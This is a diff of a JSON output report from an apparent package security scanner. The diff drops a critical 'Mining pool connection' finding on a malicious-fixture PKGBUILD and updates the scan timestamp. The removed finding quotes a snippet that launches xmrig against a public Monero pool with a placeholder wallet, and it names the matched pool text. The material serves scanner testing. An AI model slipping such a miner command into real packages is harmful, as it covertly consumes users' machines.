@@ -21,24 +21,6 @@
       }
     },
     {
-      "id": "CRYPTO-001",
-      "severity": "critical",
-      "category": "cryptomining",
-      "title": "Mining pool connection",
-      "description": "Connection to cryptocurrency mining pools",
-      "location": {
-        "file": "tests/fixtures/malicious/cryptominer/PKGBUILD",
-        "line": 16,
-        "column": 30,
-        "snippet": "    ./xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET_ADDRESS"
-      },
-      "recommendation": "Remove cryptomining components",
-      "cwe_id": "CWE-506",
-      "metadata": {
-        "matched_text": "pool.supportxmr"
-      }
-    },
-    {
       "id": "CRYPTO-002",
       "severity": "critical",
       "category": "cryptomining",
@@ -190,6 +172,6 @@
   "scanned_files": [
     "tests/fixtures/malicious/cryptominer/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T13:48:49.279541160Z",
-  "scan_duration_ms": 6
+  "timestamp": "2026-11-10T14:50:56.863117728Z",
+  "scan_duration_ms": 19
 }
